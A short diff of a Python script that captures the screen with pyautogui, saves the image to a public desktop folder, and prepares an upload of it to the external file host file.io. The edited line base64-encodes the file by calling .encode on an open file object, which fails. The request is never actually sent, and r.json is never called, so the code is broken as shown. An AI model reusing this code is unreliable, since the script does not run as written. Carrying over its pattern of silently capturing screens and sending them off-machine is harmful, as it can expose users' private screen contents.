@@ -48,7 +48,7 @@ im1 = pag.screenshot()
 im2 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot.png')
 files = {'file': open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')}
 r = requests.Request('POST', 'https://file.io', files=files)
-encoded_bytes = base64.b64encode(files.encode('utf-8'))
+encoded_bytes = base64.b64encode(open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb').encode('utf-8'))
 print(encoded_bytes)
 print(r.json)
 
